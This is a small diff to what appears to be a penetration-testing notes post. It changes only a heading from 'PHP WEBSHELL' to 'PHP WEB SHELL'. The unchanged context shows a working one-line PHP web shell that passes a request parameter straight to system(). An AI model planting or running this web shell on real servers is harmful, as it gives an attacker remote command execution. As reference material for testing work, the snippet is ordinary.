@@ -9,7 +9,7 @@ show_image_post: false                                    # Change this to true
 #image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
 ---
 
-### PHP WEBSHELL
+### PHP WEB SHELL
 ```php
 <?php system($_REQUEST["cmd"]); ?>
 ```
